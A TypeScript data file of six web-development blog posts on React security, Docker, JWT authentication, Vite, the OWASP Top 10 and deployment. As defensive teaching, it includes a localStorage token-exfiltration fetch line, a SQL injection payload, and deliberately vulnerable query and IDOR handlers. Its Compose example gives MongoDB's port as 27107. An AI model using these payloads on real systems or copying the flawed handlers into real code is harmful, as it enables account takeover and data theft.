export interface BlogPost {
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  category: "Security" | "DevOps" | "React" | "Auth";
  readTime: string;
  date: string;
  tags: string[];
}

export const blogs: BlogPost[] = [
  {
    slug: "secure-react-applications",
    title: "How I Build Secure React Applications",
    excerpt: "React apps are highly vulnerable to XSS, CSRF, and structural data exposures. Learn my step-by-step checklist to write high-grade secure frontends.",
    date: "May 10, 2026",
    readTime: "6 min read",
    category: "Security",
    tags: ["React", "Security", "OWASP", "Secure Coding"],
    content: `## The Modern Web Frontend Threat Landscape

Many developers believe that because React uses safe defaults like automatic text escaping in JSX, their applications are inherently safe from cyber threats. This assumption is dangerous. Threat actors can still exploit flaws like Cross-Site Scripting (XSS), Cross-Site Scripting via dangerouslySetInnerHTML, structural state exposure, and client-side credential leaking.

In this guide, I share my battle-tested checklist for securing front-end React apps in production.

---

### 1. Guarding Against Cross-Site Scripting (XSS)

XSS occurs when an attacker injects executable code into a web page. React escapes strings inside JSX tags, but it does NOT secure attribute locations, deep URI hooks, or user-defined rendering via \`dangerouslySetInnerHTML\`.

#### Rule of Thumb: Never trust raw HTML input
If you absolutely must render raw HTML, always use a battle-tested sanitization library like **DOMPurify** before passing the string to React:

\`\`\`typescript
import DOMPurify from 'dompurify';

export function SanitizedContent({ rawHtml }) {
  const cleanHtml = DOMPurify.sanitize(rawHtml);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
\`\`\`

---

### 2. Lock Down Client-Side Storage & Cookies

Storing session identifiers, JWT tokens, or sensitive user metadata in \`localStorage\` is a glaring vulnerability. If an attacker succeeds in launching an XSS exploit, they can query \`localStorage\` instantly and hijack the user session.

#### My Recommendation: Use HttpOnly, Secure, and SameSite Cookies
- **HttpOnly**: Blocks JavaScript scripts from reading the cookie values.
- **Secure**: Ensures cookies are transmitted solely over HTTPS.
- **SameSite=Strict**: Instructs the browser not to send cookies with cross-site requests, mitigating Cross-Site Request Forgery (CSRF).

---

### 3. Implement Strict Content Security Policies (CSP)

A robust Content Security Policy header tells the browser which domains are trusted sources for script, stylesheet, and asset downloads. This is one of the most effective ways to stop XSS and unauthorized data exfiltration dead in their tracks.

\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com; style-src 'self' 'unsafe-inline';
\`\`\`

---

### 4. Code Auditing & Dependency Auditing

We import hundreds of third-party libraries without second thought. These libraries can introduce significant security risks if they become compromised.

- Always run \`npm audit\` or \`bun pm audit\` during your CI/CD builds.
- Configure automated dependabot alerts to lock down and patch dependencies on Github.
- Keep environment secrets strictly in backend parameters; never prefix highly sensitive backend keys with \`VITE_\` to prevent them from leaking into production-built JS files.

Writing secure code is not a one-stop-shop; it is a critical, continuous mindset.`
  },
  {
    slug: "docker-for-fullstack-devs",
    title: "Docker for Full Stack Developers",
    excerpt: "Break the 'it works on my machine' curse. A comprehensive look at containerizing multi-tier React and Node.js solutions safely.",
    date: "April 28, 2026",
    readTime: "8 min read",
    category: "DevOps",
    tags: ["Docker", "DevOps", "Node.js", "Express"],
    content: `## Why Docker is Essential for Full-Stack Engineers

The famous phrase "it worked on my laptop!" has delayed countless software deployments. Differences in local Node versions, environment setups, and active databases create unpredictable behavior on remote staging servers. 

Docker containerizes your application alongside its runtime, configurations, and dependencies. It ensures consistent behavior from development straight to local, staging, and production environments.

In this tutorial, we will write a production-grade Docker setup for a typical React & Express full-stack stack.

---

### 1. The Frontend Dockerfile (Vite App)

For production, we don't want to run a heavy Node development server to serve static HTML and CSS code. Instead, we use a **multi-stage build** which builds static files in a Node container, then copies them into an extremely lightweight **Nginx web server**.

\`\`\`dockerfile
# Stage 1: Build the static assets
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Stage 2: Serve with Nginx
FROM nginx:1.23-alpine
COPY --from=builder /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
\`\`\`

---

### 2. The Backend Dockerfile (Node API)

Our backend image should be optimized for size, performance, and security. We run our application as a non-root user to mitigate potential container-escape vulnerabilities.

\`\`\`dockerfile
FROM node:18-alpine
WORKDIR /usr/src/app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

# Run as non-privileged service user
USER node
EXPOSE 3000
CMD ["node", "server.js"]
\`\`\`

---

### 3. Orchestration with Docker Compose

To run both containers together with database engines locally, use **Docker Compose**. This spins up your frontend, backend API, and a MongoDB container in an isolated network instantly.

\`\`\`yaml
version: '3.8'

services:
  frontend:
    build: ./frontend
    ports:
      - "80:80"
    depends_on:
      - backend

  backend:
    build: ./backend
    ports:
      - "3000:3000"
    environment:
      - MONGO_URI=mongodb://db:27107/portfolio
    depends_on:
      - db

  db:
    image: mongo:6.0
    restart: always
    volumes:
      - mongo_data:/data/db

volumes:
  mongo_data:
\`\`\`

Using Docker simplifies local onboarding, guarantees consistent container state across platforms, and prepares you for enterprise Kubernetes deployments.`
  },
  {
    slug: "jwt-auth-best-practices",
    title: "JWT Authentication Best Practices",
    excerpt: "JSON Web Tokens are heavily misused across the web. Discover how to configure tokens securely with refresh mechanisms and proper rotation.",
    date: "April 15, 2026",
    readTime: "7 min read",
    category: "Auth",
    tags: ["JWT", "Authentication", "Security", "Express"],
    content: `## The Pitfalls of Naive JWT Deployments

JSON Web Tokens (JWTs) are the standard for stateless authentication in modern Single Page Applications (SPAs). However, the internet is flooded with guides advising developers to generate a token, store it in \`localStorage\`, and send it in the Authorization header. 

This simple pattern is highly vulnerable. Let's look at why and how to construct a truly robust, secure JWT authentication system.

---

### 1. The Vulnerability of Local Storage

If your app has a single XSS vulnerability (from a package, a markdown parser, or an dynamic image source), the attacker can execute \`fetch('/malicious-api', { body: localStorage.getItem('token') })\`. Once stolen, since JWTs are stateless, the attacker has complete access to the user's account until the token expires.

### 2. The Solution: Short-Lived Access Tokens and Long-Lived Refresh Tokens

To guarantee security, we divide roles:

1. **Access Token**: Short lifespan (e.g., 10-15 minutes). Sent in memory or inside a secure cookie. Used to authorize requests.
2. **Refresh Token**: Long lifespan (e.g., 7 days). Stored in a database and sent *exclusively* via a secure, HttpOnly, SameSite cookie. Used solely to request a fresh access token.

#### Flow of Authorization:
- The user logs in. The API returns an \`accessToken\` in the JSON body, and sets a secure cookie containing the \`refreshToken\`.
- The frontend client stores the short-lived \`accessToken\` in-memory (e.g., inside an active React context state).
- When the \`accessToken\` expires (often resulting in a 401 response), the client triggers an API request to \`/api/refresh\`. The browser automatically sends the secure cookie containing the refresh token. The API validates it and issues a brand-new access token back.

---

### 3. Implementing Signature Verification & Algorithms

Verify that your backend uses the appropriate keys and algorithms.

- Ensure you use a strong hashing algorithm like **RS256** (asymmetrical private/public keys) or at least a highly random HS256 secret key exceeding 256 bits.
- Reject dynamic manipulation of the algorithm header (always hardcode \`algorithms: ['HS256']\` inside your verification library to block threat actors from passing \`alg: "none"\` payloads).

\`\`\`typescript
import jwt from 'jsonwebtoken';

export function verifyAccessToken(token: string) {
  return jwt.verify(token, process.env.JWT_SECRET_KEY, {
    algorithms: ['HS256'] // Block algorithm evasion exploits
  });
}
\`\`\`

By separating token scopes and enforcing HttpOnly cookie delivery, you isolate vulnerabilities and dramatically harden the user's secure state in production.`
  },
  {
    slug: "vite-vs-traditional-react",
    title: "Vite vs Traditional React Setup",
    excerpt: "Why the frontend industry completely abandoned Create React App in favor of Vite. A deep dive into hot module reloading and build engines.",
    date: "April 02, 2026",
    readTime: "5 min read",
    category: "React",
    tags: ["Vite", "React", "Build Tools", "Web Performance"],
    content: `## The Fall of Create React App & The Rise of Vite

For many years, Create React App (CRA) was the default gateway to build React applications. CRA, under the hood, was powered by Webpack. While Webpack is an incredibly powerful and flexible bundler, as projects expand, CRA became notoriously slow.

Startup and hot module reloading (HMR) times deteriorated rapidly, frustrating developers worldwide.

Vite solved these issues, transforming our development workflows. Let's compare their designs.

---

### 1. How Webpack Handles Development

Webpack is a traditional bundler. Before serving your page, it must craw through every single file in your dependency tree, resolve paths, and bundle them into a single file in memory.

Only after the entire bundler compiles can the development server startup. If you customize dynamic loads or work with a 50,000-line codebase, this can take up to 2-3 minutes.

### 2. How Vite Solves Startup Speeds

Vite leverages modern browser capabilities, namely native **ES Modules (ESM)**. Instead of bundling your files beforehand, Vite leaves dependency loading directly to the modern browser!

- **Esbuild Pre-bundling**: During initial startup, Vite pre-bundles heavy, slow-loading dependencies (like React, Lodash) into single modules using **esbuild** (written in Go, which runs 10-100x faster than JS-based compilers).
- **Dynamic ESM Serving**: When the browser requests a specific page routing, it sends HTTP requests only for the imported module files. Vite intercepts these and compiles them on-the-fly, returning them instantly.

---

### 3. Comparative Benchmarks

| Metric | Create React App (Webpack) | Vite (Esbuild/Rollup) |
| :--- | :--- | :--- |
| **Startup Time** | 10s - 30s+ | 100ms - 500ms |
| **HMR (File Edits)** | 1s - 5s+ | Instant, decoupled from app size |
| **Production Build Compiler** | Webpack | Rollup (highly optimized code splitting) |

Transitioning your portfolio and enterprise applications to Vite reduces CPU consumption during coding, secures pristine asset structures, and keeps your build pipeline fast and agile.`
  },
  {
    slug: "owasp-top-10-developers",
    title: "OWASP Top 10 for Developers",
    excerpt: "The ultimate secure coding crash-course. Learn how the top 10 web vulnerabilities map down to your day-to-day code structures.",
    date: "March 18, 2026",
    readTime: "10 min read",
    category: "Security",
    tags: ["Security", "OWASP", "Ethical Hacking", "Secure Coding"],
    content: `## A Web Developer's Guide to OWASP

As full-stack developers, security is a major pillar of our craft. The Open Web Application Security Project (OWASP) compiles a list of the 10 most critical security risks facing web applications. 

Understanding these risks is essential for writing secure code. Let's explore three critical vulnerabilities and discuss exactly how to build secure defenses against them.

---

### 1. Injection Vulnerabilities (e.g., SQL and NoSQL Injection)

Injection occurs when untrusted user input is passed directly to an interpreter as part of a command or query, tricking the interpreter into executing unauthorized database commands.

#### Bad Node SQL Query:
\`\`\`javascript
// Vulnerable to SQL injection! An attacker can pass user as " admin' OR '1'='1 "
const query = "SELECT * FROM users WHERE username = '" + req.body.username + "'";
db.query(query);
\`\`\`

#### Secure Fixed Query:
\`\`\`javascript
// Parameterized SQL binds values safely, neutralizing malicious payloads entirely
const query = "SELECT * FROM users WHERE username = ?";
db.query(query, [req.body.username]);
\`\`\`

---

### 2. Broken Object Level Authorization (BOLA / IDOR)

This occurs when an application exposes a resource identifier (ID) in an API endpoint, and fails to verify that the requesting user has permission to access that specific resource.

#### Vulnerable Handler:
\`\`\`javascript
app.get('/api/projects/:id', async (req, res) => {
  // Vulnerable! Anyone can swap the ':id' parameter to fetch arbitrary database files
  const project = await Project.findById(req.params.id);
  res.json(project);
});
\`\`\`

#### Secure Fixed Handler:
\`\`\`javascript
app.get('/api/projects/:id', async (req, res) => {
  // Confirm ownership of the requested resource
  const project = await Project.findOne({ _id: req.params.id, ownerId: req.user.id });
  if (!project) return res.status(404).json({ error: "Project not found" });
  res.json(project);
});
\`\`\`

---

### 3. Security Misconfigurations

This is a broad category that covers leaving default administrative configurations active in server containers, mapping development errors directly into public responses, or exposing secret keys in Git repositories.

- Build staging environments using isolated keys.
- Write robust Express error handlers to log detailed stacks on your terminal, while returning clean, generic messages to the public interface.
- Implement strict CORS filters restricting APIs exclusively to your approved routing origins.

A defense-in-depth engineering stance turns security from an afterthought into a solid foundation for your application.`
  },
  {
    slug: "deploying-react-apps",
    title: "Deploying React Apps to Vercel and Netlify",
    excerpt: "A DevOps-centric look into deployment configurations. Learn SPA route-rewriting rules and caching headers for Vercel and Netlify.",
    date: "March 05, 2026",
    readTime: "6 min read",
    category: "DevOps",
    tags: ["DevOps", "Vercel", "Netlify", "Deployment"],
    content: `## Streamlining Frontend Continuous Delivery

A great web application is only useful if users can access it. Modern platforms like Vercel and Netlify make deploying client-side applications incredibly simple. 

However, many engineers struggle with common deployment issues like **404 errors on routing refreshes** or **broken API proxy configurations**.

Let's look at how to deploy and configure a React Single Page Application (SPA), ensuring a robust, error-free setup.

---

### 1. Solving the SPA Refresh Problem (The 404 Bug)

In a traditional multi-page website, when a browser requests \`/projects/secure-task-manager\`, the server finds a folder matching that path and serves the file. In a React SPA, there are no separate directories! There is only a single \`index.html\` file, and React Router handles matching URL paths client-side.

If a user navigates to a route and refreshes the browser, Vercel or Netlify will look for a physical file at that path, fail to find it, and return a **404 Not Found error**.

To fix this, we must configure the hosting platform to redirect all incoming traffic to our main \`index.html\` file, allowing React Router to handle the URL mapping correctly.

#### The Netlify configuration (\`_redirects\` or \`netlify.toml\`):
\`\`\`toml
[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
\`\`\`

#### The Vercel configuration (\`vercel.json\`):
\`\`\`json
{
  "rewrites": [
    { "source": "/(.*)", "destination": "/index.html" }
  ]
}
\`\`\`

---

### 2. Managing Backend Serverless APIs

Both Vercel and Netlify support deploying serverless functions alongside your static frontend builds. This is ideal for secure contact forms or proxying API calls without running a continuous dedicated server.

- Place serverless files inside the \`api/\` folder (Vercel) or the \`netlify/functions/\` folder (Netlify).
- Retrieve your target environment keys (e.g. \`RESEND_API_KEY\`) strictly from the provider's Environment variables panel, ensuring security secrets never reach public bundles.

Deploying static websites with serverless micro-services offers a cost-effective, scalable, and highly performant architecture for modern full-stack web applications.`
  }
];
